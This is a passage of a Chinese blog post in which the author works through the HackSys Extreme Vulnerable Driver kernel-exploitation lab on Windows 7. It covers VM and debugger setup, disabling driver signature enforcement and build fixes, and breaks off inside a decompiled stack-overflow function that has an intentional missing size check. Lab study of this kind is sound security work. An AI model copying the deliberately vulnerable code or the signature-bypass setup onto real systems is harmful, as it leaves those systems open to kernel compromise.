<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>HEVD-Windows7x86 SP1 记录 - Ghostasky&#39;s Blog</title><meta name="author" content="">
<meta name="author-link" content="">
<meta name="description" content="" /><meta name="keywords" content='WINDOWS' /><meta itemprop="name" content="HEVD-Windows7x86 SP1 记录">
<meta itemprop="description" content=""><meta itemprop="datePublished" content="2023-08-12T00:00:00+00:00" />
<meta itemprop="dateModified" content="2023-08-12T00:00:00+00:00" />
<meta itemprop="wordCount" content="26039">
<meta itemprop="keywords" content="WINDOWS," /><meta property="og:title" content="HEVD-Windows7x86 SP1 记录" />
<meta property="og:description" content="" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/posts/2023-8-hevd/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-08-12T00:00:00+00:00" />
<meta property="article:modified_time" content="2023-08-12T00:00:00+00:00" />
<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="HEVD-Windows7x86 SP1 记录"/>
<meta name="twitter:description" content=""/>
<meta name="application-name" content="FixIt">
<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://localhost:1313/posts/2023-8-hevd/" /><link rel="prev" href="http://localhost:1313/posts/2023-7-linuxkernelpwn/" /><link rel="next" href="http://localhost:1313/posts/2023-8-kernelpoolexploitationonwin7/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "HEVD-Windows7x86 SP1 记录",
    "inLanguage": "zh-CN",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "http:\/\/localhost:1313\/posts\/2023-8-hevd\/"
    },"genre": "posts","keywords": "WINDOWS","wordcount":  26039 ,
    "url": "http:\/\/localhost:1313\/posts\/2023-8-hevd\/","datePublished": "2023-08-12T00:00:00+00:00","dateModified": "2023-08-12T00:00:00+00:00","publisher": {
      "@type": "Organization",
      "name": ""},"author": {
        "@type": "Person",
        "name": "作者"
      },"description": ""
  }
  </script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="Ghostasky&#39;s Blog" data-title="Ghostasky&#39;s Blog" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-text">Ghostasky&#39;s Blog</span></a><span class="header-subtitle"></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a
                class="menu-link"
                href="/posts/"
                
                
              >文章</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/categories/"
                
                
              >分类</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/tags/"
                
                
              >标签</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/about/"
                
                
              >关于</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="切换主题">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="/images/fixit.png" data-title="/images/fixit.png" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-text">Ghostasky&#39;s Blog</span></a><span class="header-subtitle"></span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/posts/"
                  
                  
                >文章</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/categories/"
                  
                  
                >分类</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/tags/"
                  
                  
                >标签</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/about/"
                  
                  
                >关于</a></li><li class="menu-item menu-system">
          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
      </ul>
    </nav>
  </div>
</header><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>HEVD-Windows7x86 SP1 记录</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
      Anonymous</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/technology/" class="post-category" title="分类 - Technology"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Technology</a></span></div><div class="post-meta-line"><span title="发布于 2023-08-12 00:00:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2023-08-12">2023-08-12</time></span>&nbsp;<span title="26039 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 26100 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 52 分钟</span>&nbsp;</div>
    </div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>目录</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#1环境搭建">1.环境搭建</a></li>
    <li><a href="#2stackoverflow-triggerbufferoverflowstack">2.StackOverflow-TriggerBufferOverflowStack</a>
      <ul>
        <li><a href="#利用">利用</a></li>
        <li><a href="#利用分析">利用分析</a></li>
        <li><a href="#shellcode分析">shellcode分析</a></li>
      </ul>
    </li>
    <li><a href="#3stackoverflowgs-triggerbufferoverflowstackgs">3.StackOverflowGS-TriggerBufferOverflowStackGS</a>
      <ul>
        <li><a href="#漏洞点分析">漏洞点分析</a></li>
        <li><a href="#确定偏移">确定偏移</a></li>
        <li><a href="#构造shellcode">构造shellcode</a></li>
      </ul>
    </li>
    <li><a href="#4arbitraryoverwrite-triggerarbitrarywrite">4.ArbitraryOverwrite-TriggerArbitraryWrite</a>
      <ul>
        <li><a href="#任意地址写原理">任意地址写原理</a></li>
        <li><a href="#内核提权haldispatchtable">内核提权–HalDispatchTable</a></li>
        <li><a href="#exp">EXP</a></li>
      </ul>
    </li>
    <li><a href="#5pooloverflow-triggerbufferoverflownonpagedpool待完善">5.PoolOverflow-TriggerBufferOverflowNonPagedPool(待完善)</a>
      <ul>
        <li><a href="#前置知识点待完成">前置知识点（待完成）</a></li>
        <li><a href="#利用原理event对象结构">利用原理&amp;Event对象结构</a></li>
        <li><a href="#漏洞分析">漏洞分析</a></li>
      </ul>
    </li>
    <li><a href="#6uaf-allocateuafobjectnonpagedpool">6.UAF-AllocateUaFObjectNonPagedPool</a>
      <ul>
        <li><a href="#漏洞分析-1">漏洞分析</a></li>
        <li><a href="#漏洞利用">漏洞利用</a></li>
        <li><a href="#exp-1">EXP</a></li>
      </ul>
    </li>
    <li><a href="#7typeconfusing-triggertypeconfusion">7.TypeConfusing-TriggerTypeConfusion</a>
      <ul>
        <li><a href="#漏洞分析-2">漏洞分析</a></li>
        <li><a href="#exp-2">EXP</a></li>
      </ul>
    </li>
    <li><a href="#8triggerintegeroverflow">8.TriggerIntegerOverflow</a>
      <ul>
        <li><a href="#漏洞分析-3">漏洞分析</a></li>
        <li><a href="#漏洞利用-1">漏洞利用</a></li>
        <li><a href="#exp-3">EXP</a></li>
      </ul>
    </li>
    <li><a href="#9nullpointerdereference">9.NullPointerDereference</a>
      <ul>
        <li><a href="#漏洞分析-4">漏洞分析</a></li>
        <li><a href="#漏洞利用-2">漏洞利用</a></li>
        <li><a href="#exp-4">EXP</a></li>
      </ul>
    </li>
    <li><a href="#10triggeruninitializedmemorystackexp存在问题">10.TriggerUninitializedMemoryStack(EXP存在问题)</a>
      <ul>
        <li><a href="#漏洞分析-5">漏洞分析</a></li>
        <li><a href="#exp未完成">EXP(未完成)</a></li>
      </ul>
    </li>
    <li><a href="#11triggeruninitializedmemorypagedpool">11.TriggerUninitializedMemoryPagedPool</a>
      <ul>
        <li><a href="#前置">前置</a></li>
        <li><a href="#漏洞分析-6">漏洞分析</a></li>
        <li><a href="#漏洞利用-3">漏洞利用</a></li>
        <li><a href="#exp-5">EXP</a></li>
      </ul>
    </li>
    <li><a href="#12triggerdoublefetch">12.TriggerDoubleFetch</a>
      <ul>
        <li><a href="#漏洞分析-7">漏洞分析</a></li>
        <li><a href="#exp-6">EXP</a></li>
      </ul>
    </li>
    <li><a href="#tips">TIPS</a></li>
    <li><a href="#参考">参考</a></li>
  </ul>
</nav></div>
      </div><div class="content" id="content"><p>本文记录自己学习HEVD的全过程。</p>
<blockquote>
<p>差不多全部完成了，还有一些小的问题需要完善，然后还有几篇文没有好好看，挑个时间好好看下</p>
<p>就这样吧，待完善的东西以后再说</p>
</blockquote>
<p>[toc]</p>
<h2 id="1环境搭建" class="heading-element">
  <a href="#1%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba" class="heading-mark"></a>1.环境搭建</h2><p>虚拟机：</p>
<pre tabindex="0"><code>文件名
cn_windows_7_professional_with_sp1_vl_build_x86_dvd_u_677939.iso
SHA1
27AE9FBAF9EE076F50F153353E42A3BE74A61FAB
文件大小
2.33GB
发布时间
2011-05-12
ed2k://|file|cn_windows_7_professional_with_sp1_vl_build_x86_dvd_u_677939.iso|2502909952|935E5B4B754527BE3C238FA6ABDD9B86|/</code></pre><p>这个装vmtools有点费劲，用了个浏览器：centbrowser</p>
<p><a href="https://www.catalog.update.microsoft.com/search.aspx?q=kb4474419"target="_blank" rel="external nofollow noopener noreferrer">https://www.catalog.update.microsoft.com/search.aspx?q=kb4474419</a></p>
<p><img loading="lazy" src="/posts/2023-8-hevd/image-20230812111418904.png" alt="/posts/2023-8-hevd/image-20230812111418904.png" srcset="/posts/2023-8-hevd/image-20230812111418904.png?size=small, /posts/2023-8-hevd/image-20230812111418904.png?size=medium 1.5x, /posts/2023-8-hevd/image-20230812111418904.png?size=large 2x" data-title="/posts/2023-8-hevd/image-20230812111418904.png" style="--width: 1909px;--aspect-ratio: 1909 / 339;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>安装：VirtualKD-Redux-2022.2\target32
<img loading="lazy" src="/posts/2023-8-hevd/image-20230812111613251.png" alt="/posts/2023-8-hevd/image-20230812111613251.png" srcset="/posts/2023-8-hevd/image-20230812111613251.png?size=small, /posts/2023-8-hevd/image-20230812111613251.png?size=medium 1.5x, /posts/2023-8-hevd/image-20230812111613251.png?size=large 2x" data-title="/posts/2023-8-hevd/image-20230812111613251.png" style="--width: 821px;--aspect-ratio: 821 / 269;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p><img loading="lazy" src="/posts/2023-8-hevd/image-20230812111708539.png" alt="/posts/2023-8-hevd/image-20230812111708539.png" srcset="/posts/2023-8-hevd/image-20230812111708539.png?size=small, /posts/2023-8-hevd/image-20230812111708539.png?size=medium 1.5x, /posts/2023-8-hevd/image-20230812111708539.png?size=large 2x" data-title="/posts/2023-8-hevd/image-20230812111708539.png" style="--width: 565px;--aspect-ratio: 565 / 243;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>重启F8
<img loading="lazy" src="/posts/2023-8-hevd/image-20230812111827122.png" alt="/posts/2023-8-hevd/image-20230812111827122.png" srcset="/posts/2023-8-hevd/image-20230812111827122.png?size=small, /posts/2023-8-hevd/image-20230812111827122.png?size=medium 1.5x, /posts/2023-8-hevd/image-20230812111827122.png?size=large 2x" data-title="/posts/2023-8-hevd/image-20230812111827122.png" style="--width: 1027px;--aspect-ratio: 1027 / 791;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>配置Win7测试模式：</p>
<ul>
<li>管理员运行cmd：<code>bcdedit -debug on</code></li>
<li>重启系统</li>
</ul>
<p>Win7 配置永久禁止验证驱动文件</p>
<p>gpedit.msc &ndash;&gt; 用户配置 &ndash;&gt; 管理模板 &ndash;&gt; 系统 &ndash;&gt; 驱动程序安装-&gt;
设备驱动程序的代码签名 &ndash;&gt; 选择<strong>已启用</strong> &ndash;&gt;选项选择<strong>忽略</strong>，重启</p>
<p><img loading="lazy" src="/posts/2023-8-hevd/image-20230812112351965.png" alt="/posts/2023-8-hevd/image-20230812112351965.png" srcset="/posts/2023-8-hevd/image-20230812112351965.png?size=small, /posts/2023-8-hevd/image-20230812112351965.png?size=medium 1.5x, /posts/2023-8-hevd/image-20230812112351965.png?size=large 2x" data-title="/posts/2023-8-hevd/image-20230812112351965.png" style="--width: 1877px;--aspect-ratio: 1877 / 818;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>dbgview
kmdmanager</p>
<p><img loading="lazy" src="/posts/2023-8-hevd/image-20230812113512169.png" alt="/posts/2023-8-hevd/image-20230812113512169.png" srcset="/posts/2023-8-hevd/image-20230812113512169.png?size=small, /posts/2023-8-hevd/image-20230812113512169.png?size=medium 1.5x, /posts/2023-8-hevd/image-20230812113512169.png?size=large 2x" data-title="/posts/2023-8-hevd/image-20230812113512169.png" style="--width: 1351px;--aspect-ratio: 1351 / 438;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<div class="highlight" id="id-2"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">kd&gt; lm m h*
</span></span><span class="line"><span class="cl">Browse full module list
</span></span><span class="line"><span class="cl">start    end        module name
</span></span><span class="line"><span class="cl"><span class="m">84238000</span> 8426e000   hal        <span class="o">(</span>deferred<span class="o">)</span>             
</span></span><span class="line"><span class="cl"><span class="m">88635000</span> 8863d000   hwpolicy   <span class="o">(</span>deferred<span class="o">)</span>             
</span></span><span class="line"><span class="cl">9240c000 <span class="m">92491000</span>   HTTP       <span class="o">(</span>deferred<span class="o">)</span>             
</span></span><span class="line"><span class="cl">9d2b3000 9d2d2000   HDAudBus   <span class="o">(</span>deferred<span class="o">)</span>             
</span></span><span class="line"><span class="cl">9d855000 9d8a5000   HdAudio    <span class="o">(</span>deferred<span class="o">)</span>             
</span></span><span class="line"><span class="cl">9d9b6000 9d9c1000   hidusb     <span class="o">(</span>deferred<span class="o">)</span>             
</span></span><span class="line"><span class="cl">9d9c1000 9d9d4000   HIDCLASS   <span class="o">(</span>deferred<span class="o">)</span>             
</span></span><span class="line"><span class="cl">9d9d4000 9d9da480   HIDPARSE   <span class="o">(</span>deferred<span class="o">)</span>             
</span></span><span class="line"><span class="cl">aa16b000 aa1b5000   HEVD       <span class="o">(</span>private pdb symbols<span class="o">)</span>  d:<span class="se">\w</span>inddk<span class="se">\s</span>ymbols<span class="se">\H</span>EVD.pdb<span class="se">\8</span>921ACC09C6B46A38CA2F42DA3E21ADA1<span class="se">\H</span>EVD.pdb</span></span></code></pre></div><p>将gdb文件放到符号表目录里，我的是：</p>
<pre tabindex="0"><code>.sympath SRV*D:\WinDDK\symbols*http://msdl.microsoft.com/download/symbols;
.reload</code></pre><p>测试符号表：<code>x HEVD!*</code></p>
<div class="highlight" id="id-4"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">kd&gt; x HEVD!*
</span></span><span class="line"><span class="cl">aa16e014          HEVD!__security_cookie_complement <span class="o">=</span> 0x2aaa9a21
</span></span><span class="line"><span class="cl">aa16e018          HEVD!g_ARWHelperObjectNonPagedPoolNx <span class="o">=</span> struct _ARW_HELPER_OBJECT_NON_PAGED_POOL_NX *<span class="o">[</span>65535<span class="o">]</span>
</span></span><span class="line"><span class="cl">aa1ae014          HEVD!g_UseAfterFreeObjectNonPagedPool <span class="o">=</span> 0x00000000
</span></span><span class="line"><span class="cl">aa16d04c          HEVD!__guard_check_icall_fptr <span class="o">=</span> 0xaa16c404
</span></span><span class="line"><span class="cl">aa16d050          HEVD!GuardCheckLongJumpTargetImpl <span class="o">=</span> 0x00000000
</span></span><span class="line"><span class="cl">aa16d140          HEVD!__safe_se_handler_table <span class="o">=</span> void *<span class="o">[]</span>
</span></span><span class="line"><span class="cl">aa16d098          HEVD!_load_config_used <span class="o">=</span> struct _IMAGE_LOAD_CONFIG_DIRECTORY32
</span></span><span class="line"><span class="cl">aa16e010          HEVD!__security_cookie <span class="o">=</span> 0xd55565de
</span></span><span class="line"><span class="cl">aa16e000          HEVD!__NLG_Destination <span class="o">=</span> struct _NLG_INFO
</span></span><span class="line"><span class="cl">aa1ae018          HEVD!g_UseAfterFreeObjectNonPagedPoolNx <span class="o">=</span> 0x00000000
</span></span><span class="line"><span class="cl">aa1b1410          HEVD!FreeUaFObjectNonPagedPoolIoctlHandler <span class="o">(</span>struct _IRP *, struct _IO_STACK_LOCATION *<span class="o">)</span>
</span></span><span class="line"><span class="cl">aa1b17f2          HEVD!UaFObjectCallbackNonPagedPoolNx <span class="o">(</span>void<span class="o">)</span>
</span></span><span class="line"><span class="cl">aa1b0920          HEVD!TriggerMemoryDisclosureNonPagedPoolNx <span class="o">(</span>void *, unsigned long<span class="o">)</span>
</span></span><span class="line"><span class="cl">aa1b03aa          HEVD!TriggerDoubleFetch <span class="o">(</span>struct _DOUBLE_FETCH *<span class="o">)</span>
</span></span><span class="line"><span class="cl">aa1b0ade          HEVD!TriggerNullPointerDereference <span class="o">(</span>void *<span class="o">)</span>
</span></span><span class="line"><span class="cl">aa1b173c          HEVD!FreeUaFObjectNonPagedPoolNx <span class="o">(</span>void<span class="o">)</span>
</span></span><span class="line"><span class="cl">aa16c045          HEVD!__SEH_epilog4 <span class="o">(</span>void<span class="o">)</span>
</span></span><span class="line"><span class="cl">aa16c3a5          HEVD!_NLG_Notify <span class="o">(</span>void<span class="o">)</span>
</span></span><span class="line"><span class="cl">aa16c000          HEVD!__SEH_prolog4 <span class="o">(</span>void<span class="o">)</span>
</span></span><span class="line"><span class="cl">aa1b0aaa          HEVD!NullPointerDereferenceIoctlHandler <span class="o">(</span>struct _IRP *, struct _IO_STACK_LOCATION *<span class="o">)</span>
</span></span><span class="line"><span class="cl">aa16c2d0          HEVD!_unwind_handler4 <span class="o">(</span>void<span class="o">)</span>
</span></span><span class="line"><span class="cl">aa1af5e4          HEVD!CreateArbitraryReadWriteHelperObjectNonPagedPoolNx <span class="o">(</span>struct _ARW_HELPER_OBJECT_IO *<span class="o">)</span>
</span></span><span class="line"><span class="cl">aa1b1806          HEVD!UseUaFObjectNonPagedPoolNx <span class="o">(</span>void<span class="o">)</span>
</span></span><span class="line"><span class="cl">aa1b14f0          HEVD!AllocateFakeObjectNonPagedPoolNx <span class="o">(</span>struct _FAKE_OBJECT_NON_PAGED_POOL_NX *<span class="o">)</span>
</span></span><span class="line"><span class="cl">aa1b14e8          HEVD!UseUaFObjectNonPagedPoolIoctlHandler <span class="o">(</span>struct _IRP *, struct _IO_STACK_LOCATION *<span class="o">)</span></span></span></code></pre></div><p>编程环境这里wdk和sdk要一样，都安装的1809的那个</p>
<p>我又装了个vs2017，重新编译的，可能需要注意的几个地方：</p>
<pre tabindex="0"><code>MSB8038	已启用 Spectre 缓解，但找不到 Spectre 缓解库。验证 Visual Studio 工作负荷包括 Spectre 缓解库。有关详细信息，请参阅 https://aka.ms/Ofhn4c。	HackSysExtremeVulnerableDriver	C:\Program Files (x86)\Microsoft Visual Studio\2017\Community\Common7\IDE\VC\VCTargets\Microsoft.CppBuild.targets	402	</code></pre><p>禁用掉</p>
<p><img loading="lazy" src="/posts/2023-8-hevd/image-20230812075020399.png" alt="/posts/2023-8-hevd/image-20230812075020399.png" srcset="/posts/2023-8-hevd/image-20230812075020399.png?size=small, /posts/2023-8-hevd/image-20230812075020399.png?size=medium 1.5x, /posts/2023-8-hevd/image-20230812075020399.png?size=large 2x" data-title="/posts/2023-8-hevd/image-20230812075020399.png" style="--width: 1095px;--aspect-ratio: 1095 / 732;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<pre tabindex="0"><code>Invalid certificate or password.	HackSysExtremeVulnerableDriver	D:\Windows Kits\10\build\WindowsDriver.common.targets	1373	</code></pre><p>HEVD.pfx删掉：
<a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/issues/29"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/issues/29</a></p>
<p><img loading="lazy" src="/posts/2023-8-hevd/image-20230812075232152.png" alt="/posts/2023-8-hevd/image-20230812075232152.png" srcset="/posts/2023-8-hevd/image-20230812075232152.png?size=small, /posts/2023-8-hevd/image-20230812075232152.png?size=medium 1.5x, /posts/2023-8-hevd/image-20230812075232152.png?size=large 2x" data-title="/posts/2023-8-hevd/image-20230812075232152.png" style="--width: 1095px;--aspect-ratio: 1095 / 732;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<pre tabindex="0"><code>&#34;Inf2Cat, signability test failed.&#34; Double click to see the tool output.	HackSysExtremeVulnerableDriver	C:\Users\29927\Downloads\HackSysExtremeVulnerableDriver-master\Driver\HEVD\Windows\x64\DebugSecure\inf2catOutput.log	1	</code></pre><p>设置成本地事件即可</p>
<p><img loading="lazy" src="/posts/2023-8-hevd/image-20230812075339890.png" alt="/posts/2023-8-hevd/image-20230812075339890.png" srcset="/posts/2023-8-hevd/image-20230812075339890.png?size=small, /posts/2023-8-hevd/image-20230812075339890.png?size=medium 1.5x, /posts/2023-8-hevd/image-20230812075339890.png?size=large 2x" data-title="/posts/2023-8-hevd/image-20230812075339890.png" style="--width: 1095px;--aspect-ratio: 1095 / 732;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>之后注册打开就行：</p>
<p><img loading="lazy" src="/posts/2023-8-hevd/image-20230812075610578.png" alt="/posts/2023-8-hevd/image-20230812075610578.png" srcset="/posts/2023-8-hevd/image-20230812075610578.png?size=small, /posts/2023-8-hevd/image-20230812075610578.png?size=medium 1.5x, /posts/2023-8-hevd/image-20230812075610578.png?size=large 2x" data-title="/posts/2023-8-hevd/image-20230812075610578.png" style="--width: 559px;--aspect-ratio: 559 / 676;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>输入命令 <code>lm m h*</code></p>
<div class="highlight" id="id-8"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">1: kd&gt;  lm m h*
</span></span><span class="line"><span class="cl">Browse full module list
</span></span><span class="line"><span class="cl">start             end                 module name
</span></span><span class="line"><span class="cl">fffff805<span class="sb">`</span><span class="m">09875000</span> fffff805<span class="sb">`</span><span class="m">09912000</span>   hal        <span class="o">(</span>deferred<span class="o">)</span>             
</span></span><span class="line"><span class="cl">fffff805<span class="sb">`</span>0e3e0000 fffff805<span class="sb">`</span>0e448000   HdAudio    <span class="o">(</span>deferred<span class="o">)</span>             
</span></span><span class="line"><span class="cl">fffff805<span class="sb">`</span>0e680000 fffff805<span class="sb">`</span>0e7cd000   HTTP       <span class="o">(</span>deferred<span class="o">)</span>             
</span></span><span class="line"><span class="cl">fffff805<span class="sb">`</span>0e8b0000 fffff805<span class="sb">`</span>0e8c3000   HIDPARSE   <span class="o">(</span>deferred<span class="o">)</span>             
</span></span><span class="line"><span class="cl">fffff805<span class="sb">`</span>0ecf0000 fffff805<span class="sb">`</span>0ed02000   hidusb     <span class="o">(</span>deferred<span class="o">)</span>             
</span></span><span class="line"><span class="cl">fffff805<span class="sb">`</span>0ed10000 fffff805<span class="sb">`</span>0ed4b000   HIDCLASS   <span class="o">(</span>deferred<span class="o">)</span>             
</span></span><span class="line"><span class="cl">fffff805<span class="sb">`</span>0ef30000 fffff805<span class="sb">`</span>0ef4f000   HDAudBus   <span class="o">(</span>deferred<span class="o">)</span>             
</span></span><span class="line"><span class="cl">fffff805<span class="sb">`</span>0f8b0000 fffff805<span class="sb">`</span>0f93e000   HEVD       <span class="o">(</span>deferred<span class="o">)</span> </span></span></code></pre></div><h2 id="2stackoverflow-triggerbufferoverflowstack" class="heading-element">
  <a href="#2stackoverflow-triggerbufferoverflowstack" class="heading-mark"></a>2.StackOverflow-TriggerBufferOverflowStack</h2><p>HEVD源码示例 <code>HackSysExtremeVulnerableDriver-3.00\Driver\HEVD\BufferOverflowStack.c</code> 即为存在栈溢出的源码文件</p>
<p>没有检查UserBuffer的大小直接复制给了KernelBuffer</p>
<div class="highlight" id="id-9"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__stdcall</span> <span class="nf">TriggerBufferOverflowStack</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">UserBuffer</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">Size</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">KernelBuffer</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span> <span class="c1">// [esp+10h] [ebp-81Ch] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">CPPEH_RECORD</span> <span class="n">ms_exc</span><span class="p">;</span> <span class="c1">// [esp+814h] [ebp-18h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="nf">memset</span><span class="p">(</span><span class="n">KernelBuffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">KernelBuffer</span><span class="p">));</span>
